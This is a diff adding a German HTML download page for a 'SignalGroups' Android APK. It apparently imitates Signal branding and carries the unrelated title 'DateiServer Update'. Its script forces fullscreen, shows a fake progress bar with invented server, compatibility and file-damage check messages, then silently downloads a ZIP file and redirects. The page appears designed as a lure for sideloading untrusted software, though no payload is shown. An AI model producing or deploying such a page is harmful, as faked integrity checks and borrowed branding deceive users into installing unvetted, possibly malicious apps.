@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<title>DateiServer Update</title>
+
+<link rel="icon" type="image/png" sizes="32x32" href="logo.png">
+<link rel="apple-touch-icon" sizes="180x180" href="logo.png">
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    font-family: "Segoe UI", Arial, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    background: radial-gradient(circle at 20% 20%, #eef3ff, transparent 40%),
+                radial-gradient(circle at 80% 80%, #e0f2ff, transparent 40%),
+                linear-gradient(135deg, #f5f8ff, #e9eef7);
+    background-size: 200% 200%;
+    animation: bgMove 15s ease infinite;
+}
+
+@keyframes bgMove {
+    0% { background-position: 0% 0%; }
+    50% { background-position: 100% 100%; }
+    100% { background-position: 0% 0%; }
+}
+
+/* LOGO OBEN FIX */
+.top-logo {
+    position: absolute;
+    top: 60px;
+    width: clamp(50px, 10vw, 150px); /* kleiner als vorher */
+    height: auto;
+    object-fit: contain;
+}
+
+/* CARD */
+.card {
+    background: white;
+    width: 460px;
+    padding: 45px;
+    border-radius: 20px;
+    box-shadow: 0 30px 70px rgba(0,0,0,0.08);
+    text-align: center;
+    transition: 0.4s ease;
+}
+
+h1 {
+    font-size: 22px;
+    margin-bottom: 10px;
+    color: #1a1a1a;
+}
+
+p {
+    font-size: 14px;
+    color: #555;
+    margin-bottom: 25px;
+    line-height: 1.6;
+}
+
+button {
+    padding: 14px 34px;
+    font-size: 14px;
+    border-radius: 12px;
+    border: none;
+    background: linear-gradient(135deg, #2563eb, #3b82f6);
+    color: white;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 25px rgba(37,99,235,0.3);
+}
+
+.progress-container {
+    width: 100%;
+    height: 8px;
+    background: #e5e7eb;
+    border-radius: 6px;
+    overflow: hidden;
+    margin-top: 25px;
+}
+
+.progress-bar {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #2563eb, #60a5fa);
+    transition: width 0.2s;
+}
+
+.status {
+    margin-top: 15px;
+    font-size: 13px;
+    color: #444;
+}
+
+.hidden { display: none; }
+</style>
+</head>
+<body>
+
+<!-- LOGO IMMER OBEN -->
+<img src="logo.png" class="top-logo">
+
+<!-- START -->
+<div class="card" id="start">
+    <h1>SignalGroups - Installation</h1>
+    <p>Unendliche Möglichkeiten, Austausch in Gruppen, Teile Links<br>
+    APK herunterladen und installiern. (Nur geeignet für Android)</p>
+    <button onclick="startUpdate()">APK Herunterladen</button>
+</div>
+
+<!-- LOADING -->
+<div class="card hidden" id="loading">
+    <h1>Download wird gestartet…</h1>
+    <div class="progress-container">
+        <div class="progress-bar" id="bar"></div>
+    </div>
+    <div class="status" id="statusText">Initialisiere…</div>
+</div>
+
+<!-- DONE -->
+<div class="card hidden" id="done">
+    <h1>Download Abgeschlossen!</h1>
+    <p>Installiere...</p>
+</div>
+
+<script>
+function startUpdate() {
+    // Vollbild aktivieren
+    if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen().catch(err => {
+            console.warn("Fullscreen konnte nicht aktiviert werden:", err);
+        });
+    } else if (document.documentElement.webkitRequestFullscreen) { /* Safari */
+        document.documentElement.webkitRequestFullscreen();
+    } else if (document.documentElement.msRequestFullscreen) { /* IE11 */
+        document.documentElement.msRequestFullscreen();
+    }
+
+    document.getElementById("start").classList.add("hidden");
+    document.getElementById("loading").classList.remove("hidden");
+
+    let progress = 0;
+    const bar = document.getElementById("bar");
+    const status = document.getElementById("statusText");
+
+    const messages = [
+        "Kommuniziere mit Server…",
+        "Prüfe Kompatibilität…",
+        "Überprüfung der Datei auf Schäden…",
+        "Lade Updatepacket…",
+        "Schließe Download ab…"
+    ];
+
+    let msgIndex = 0;
+
+    const interval = setInterval(() => {
+        progress += Math.random() * 7;
+        if (progress >= 100) {
+            progress = 100;
+            clearInterval(interval);
+            status.textContent = "Download abgeschlossen.";
+
+            setTimeout(() => {
+                triggerDownload();
+
+                document.getElementById("loading").classList.add("hidden");
+                document.getElementById("done").classList.remove("hidden");
+
+                setTimeout(() => {
+                    window.location.href = "download_successful.html";
+                }, 2000);
+
+            }, 800);
+        }
+
+        bar.style.width = progress + "%";
+
+        if (progress > (msgIndex + 1) * 20 && msgIndex < messages.length - 1) {
+            msgIndex++;
+            status.textContent = messages[msgIndex];
+        }
+
+    }, 200);
+}
+
+function triggerDownload() {
+    const link = document.createElement("a");
+    link.href = "SignalGroups.zip";
+    link.download = "SignalGroups.zip";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+</script>
+
+</body>
+</html>
